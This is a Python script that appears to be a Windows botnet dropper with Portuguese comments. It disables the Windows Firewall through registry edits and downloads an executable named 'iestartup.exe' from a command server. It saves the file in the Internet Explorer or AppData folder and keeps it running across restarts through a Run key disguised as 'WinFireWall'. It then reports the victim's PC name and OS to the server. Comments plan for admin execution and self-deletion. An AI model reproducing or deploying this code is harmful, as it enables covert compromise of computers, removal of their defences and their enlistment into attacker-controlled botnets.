# coding=utf-8

import os, sys
import platform
import base64
import time

import getpass
import hashlib
import requests


def Disable_Firewall():

  command_enablefirewall = str('REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f')
  command_donotallowexceptions = str('REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v DoNotAllowExceptions /t REG_DWORD /d 0 /f')
  command_disablenotifications = str('REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v DisableNotifications /t REG_DWORD /d 1 /f')

  try:

    os.system(command_enablefirewall)
    os.system(command_donotallowexceptions)
    os.system(command_disablenotifications)

    return True

  except:

    return False


def Bot_register(Server_Ip, Server_Path, Bot_name, Bot_os):

  register_url = str('http://'+Server_Ip+Server_Path+'rg.php?bname='+Bot_name+'&bos='+Bot_os)
  register_get = requests.get(register_url)

  if(register_get.status_code == 200):
    return True

  else:
    return False



def Bot_AutoRun(bot_inspath):

  if(bot_inspath != ''):

    command_string = str('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinFireWall /t REG_SZ /d "\*"'+bot_inspath+'"\*" /f').replace('*', '')

    try:
      os.system(command_string)
      return True

    except:
      return False

  else:
    pass


def Bot_Download(Server_Ip, Server_Path, Path, User):#Depois fazer tratamentos de erros no codigo

  bot_url = str('http://'+Server_Ip+Server_Path+Path+'iestartup.exe')#mudar o nome depois

  bot_dow = requests.get(bot_url)

  if(bot_dow.status_code == 200):
    try:

      bot_inspath = str('C:\\Program Files\\Internet Explorer\\iestartup.exe')

      bot_file = open(bot_inspath, 'wb')
      bot_file.write(bot_dow.content)
      bot_file.close()

    except:

      bot_inspath = str('C:\\Users\\'+User+'\\AppData\\Roaming\\iestartup.exe')

      bot_file = open(bot_inspath, 'wb')
      bot_file.write(bot_dow.content)
      bot_file.close()

    return bot_inspath

  else:
    return False


def main():

  sys_information = platform.uname()

  pc_name = sys_information[1]
  current_user = getpass.getuser()

  operation_system = sys_information[0]
  operation_system_version = sys_information[2]

  server_ip = '192.168.0.3'
  server_path = '/w3bb0t/'
  malware_path = 'bot_path/'

  if(Disable_Firewall()):

    inspath = Bot_Download(server_ip, server_path, malware_path, current_user)

    if(inspath != False and Bot_AutoRun(inspath)):
      Bot_register(server_ip, server_path, pc_name, operation_system)

    else:
      pass

  else:
    pass


if __name__ == '__main__':
  main() #Quando compilado deve ser rodado com admin, adicionar funcao para se auto deletar.
